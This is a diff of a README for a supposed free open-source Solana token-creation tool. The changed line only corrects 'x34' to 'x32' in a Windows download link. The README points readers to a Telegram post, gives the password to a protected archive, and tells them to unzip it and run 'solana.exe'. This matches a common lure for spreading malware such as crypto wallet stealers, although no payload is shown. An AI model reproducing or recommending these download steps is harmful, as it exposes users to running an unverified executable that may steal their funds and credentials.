@@ -4,7 +4,7 @@
 Free open-sources software for creating your own token on the solan blockchain with fine-tuning
 
 # Installation
-+ [Download the Windows x34/x64 version](https://t.me/longshortpoxyi/57)
++ [Download the Windows x32/x64 version](https://t.me/longshortpoxyi/57)
 
 ## The archive password is ***S0Lbot!bysmoke***
  *Download the archive, unzip it and launch the "solana.exe" file
